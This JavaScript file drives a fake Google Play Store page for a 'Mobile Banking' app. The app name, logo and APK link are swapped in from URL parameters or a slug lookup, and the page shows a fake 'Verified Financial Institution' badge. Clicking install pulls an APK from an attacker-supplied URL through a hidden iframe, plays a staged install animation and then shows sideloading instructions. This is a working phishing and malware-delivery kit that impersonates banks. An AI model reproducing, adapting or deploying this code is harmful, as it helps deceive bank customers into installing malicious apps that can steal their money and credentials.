// Google Play Store Interactive Script

const installButton = document.querySelector('#installButton');
const notice = document.querySelector('#notice');
const dismissNotice = document.querySelector('#dismissNotice');
const noticeText = document.querySelector('#noticeText');
const apkPath = 'base.apk';

async function loadPublishedApp() {
	const params = new URLSearchParams(window.location.search);
	let slug = params.get('slug');
	const appName = params.get('appName');
	const appLogo = params.get('logo');
	const appApk = params.get('apk');

	// Extract slug from clean URL path /app/:slug if query parameter is not present
	if (!slug) {
		const pathSegments = window.location.pathname.split('/').filter(Boolean);
		if (pathSegments.length > 0) {
			const lastSegment = pathSegments[pathSegments.length - 1];
			if (lastSegment && lastSegment !== 'index.html') {
				slug = lastSegment;
			}
		}
	}

	function applyAppData(app) {
		if (!app) return;
		const name = app.name || appName || 'Mobile Banking';
		
		// 1. Update Document Title dynamically
		document.title = `${name}: Mobile Banking & Financial Services - Apps on Google Play`;
		
		// 2. Update Main App Name heading
		const nameEl = document.querySelector('#appName');
		if (nameEl) nameEl.textContent = name;

		// 3. Update Developer Name
		const devEl = document.querySelector('#appDeveloper');
		if (devEl) {
			const devName = app.developer || `${name} Official`;
			devEl.innerHTML = `${devName} <span class="verified" title="Verified Financial Institution">✓</span>`;
		}

		// 4. Update Tagline
		const tagEl = document.querySelector('#appTagline');
		if (tagEl) tagEl.textContent = app.tagline || 'Secure Mobile Banking, Instant UPI Transfers & Financial Services';

		// 5. Update Description
		const descEl = document.querySelector('#appDescription');
		if (descEl) descEl.textContent = app.description || `Official ${name} Mobile Banking app. Experience next-generation mobile banking with instant money transfers, pre-approved credit services, credit card management, and 24/7 account security. Built with 256-bit bank-grade encryption.`;

		// 6. Update Version
		const verEl = document.querySelector('#appVersion');
		if (verEl && app.version) verEl.textContent = `Version ${app.version}`;

		// 7. Update Logo Image
		const logoEl = document.querySelector('#appLogo');
		if (logoEl && (app.logoUrl || appLogo)) {
			logoEl.src = app.logoUrl || appLogo;
			logoEl.alt = `${name} Logo`;
		}

		// 8. Update Breadcrumb trail
		const breadcrumbEl = document.querySelector('.breadcrumbs span:last-child');
		if (breadcrumbEl) breadcrumbEl.textContent = `${name} - Mobile Banking`;

		// 9. Update APK Download Dataset
		if (installButton) {
			if (app.apkUrl || appApk) installButton.dataset.apk = app.apkUrl || appApk;
		}
	}

	// Apply direct URL query parameters if present
	if (appName || appLogo || appApk) {
		applyAppData({ name: appName, logoUrl: appLogo, apkUrl: appApk });
	}

	// Fetch slug data from Vercel API if slug parameter is present
	if (slug) {
		try {
			const response = await fetch(`/api/app?slug=${encodeURIComponent(slug)}`);
			if (response.ok) {
				const app = await response.json();
				applyAppData(app);
			}
		} catch (error) {
			console.error('Could not load published app details for slug:', slug, error);
		}
	}
}

loadPublishedApp();

// Realistic Play Store Install Progress & Open App Modal Handler
if (installButton) {
	installButton.addEventListener('click', () => {
		const modal = document.querySelector('#installModal');
		const currentAppName = document.querySelector('#appName')?.textContent || 'App';
		const modalApkName = document.querySelector('#modalApkName');
		if (modalApkName) modalApkName.textContent = `${currentAppName.replace(/[^a-z0-9]/gi, '_')}.apk`;

		// State A: Button is in 'Open' state (App already downloaded)
		if (installButton.classList.contains('installed')) {
			if (modal) modal.classList.add('show');
			return;
		}

		// State B: Already installing animation running
		if (installButton.classList.contains('installing')) return;

		// State C: First Click -> Trigger APK Download
		const apkUrl = installButton.dataset.apk;
		if (apkUrl && apkUrl !== '#') {
			const iframe = document.createElement('iframe');
			iframe.style.display = 'none';
			iframe.src = apkUrl;
			document.body.appendChild(iframe);
			setTimeout(() => iframe.remove(), 6000);
		}

		installButton.classList.add('installing');
		const label = installButton.querySelector('.button-label');
		if (label) label.textContent = 'Preparing...';

		// Step 1: Downloading phase
		window.setTimeout(() => {
			if (label) label.textContent = 'Downloading (45%)...';
		}, 700);

		// Step 2: Installing phase
		window.setTimeout(() => {
			if (label) label.textContent = 'Installing...';
		}, 1400);

		// Step 3: Complete state -> Change to 'Open'
		window.setTimeout(() => {
			installButton.classList.remove('installing');
			installButton.classList.add('installed');
			if (label) label.textContent = 'Open';
			const avail = document.querySelector('.availability');
			if (avail) avail.textContent = '✓ Download complete';
			
			if (notice) {
				if (noticeText) noticeText.textContent = `${currentAppName} downloaded. Click Open for installation steps.`;
				notice.classList.add('show');
			}

			// Automatically show Installation Guide Modal after download completes!
			if (modal) modal.classList.add('show');
		}, 2200);
	});
}

// Modal Dismiss Controls
const installModal = document.querySelector('#installModal');
const closeInstallModal = document.querySelector('#closeInstallModal');
const gotItModalBtn = document.querySelector('#gotItModalBtn');

if (closeInstallModal && installModal) {
	closeInstallModal.addEventListener('click', () => installModal.classList.remove('show'));
}
if (gotItModalBtn && installModal) {
	gotItModalBtn.addEventListener('click', () => installModal.classList.remove('show'));
}
if (installModal) {
	installModal.addEventListener('click', (e) => {
		if (e.target === installModal) installModal.classList.remove('show');
	});
}

// Dismiss Notice Toast Banner
if (dismissNotice) {
	dismissNotice.addEventListener('click', () => notice.classList.remove('show'));
}

// Wishlist Chip Handler
const wishlistChip = document.querySelector('#wishlistChip');
if (wishlistChip) {
	wishlistChip.addEventListener('click', () => {
		wishlistChip.classList.toggle('active');
		const isAdded = wishlistChip.classList.contains('active');
		wishlistChip.style.background = isAdded ? '#e8f0fe' : '#ffffff';
		wishlistChip.style.borderColor = isAdded ? '#c2e7ff' : '#dadce0';
		
		const currentAppName = document.querySelector('#appName')?.textContent || 'App';
		if (notice) {
			if (noticeText) {
				noticeText.textContent = isAdded
					? `${currentAppName} has been added to your wishlist.`
					: `${currentAppName} removed from your wishlist.`;
			}
			notice.classList.add('show');
		}
	});
}

// Share Chip Handler
const shareChip = document.querySelector('#shareChip');
if (shareChip) {
	shareChip.addEventListener('click', async () => {
		const currentAppName = document.querySelector('#appName')?.textContent || 'App';
		if (navigator.share) {
			try {
				await navigator.share({
					title: `${currentAppName} - Mobile Banking`,
					text: `Check out ${currentAppName} on Google Play!`,
					url: window.location.href,
				});
			} catch (e) {
				console.log('Share canceled');
			}
		} else {
			navigator.clipboard.writeText(window.location.href);
			if (notice) {
				if (noticeText) noticeText.textContent = 'App link copied to clipboard!';
				notice.classList.add('show');
			}
		}
	});
}

// Screenshots Carousel Navigation Arrows
const screenshotsContainer = document.querySelector('#screenshotsList');
const shotPrev = document.querySelector('#shotPrev');
const shotNext = document.querySelector('#shotNext');

if (screenshotsContainer && shotPrev && shotNext) {
	shotPrev.addEventListener('click', () => {
		screenshotsContainer.scrollBy({ left: -240, behavior: 'smooth' });
	});
	shotNext.addEventListener('click', () => {
		screenshotsContainer.scrollBy({ left: 240, behavior: 'smooth' });
	});
}

// Bottom Mobile Navigation active state
document.querySelectorAll('.bottom-nav a').forEach((link) => {
	link.addEventListener('click', () => {
		document.querySelector('.bottom-nav a.active')?.classList.remove('active');
		link.classList.add('active');
	});
});

// Keyboard shortcut (⌘ K / Ctrl K) for Search
document.addEventListener('keydown', (e) => {
	if ((e.metaKey || e.ctrlKey) && e.key === 'k') {
		e.preventDefault();
		document.querySelector('#searchInput')?.focus();
	}
});
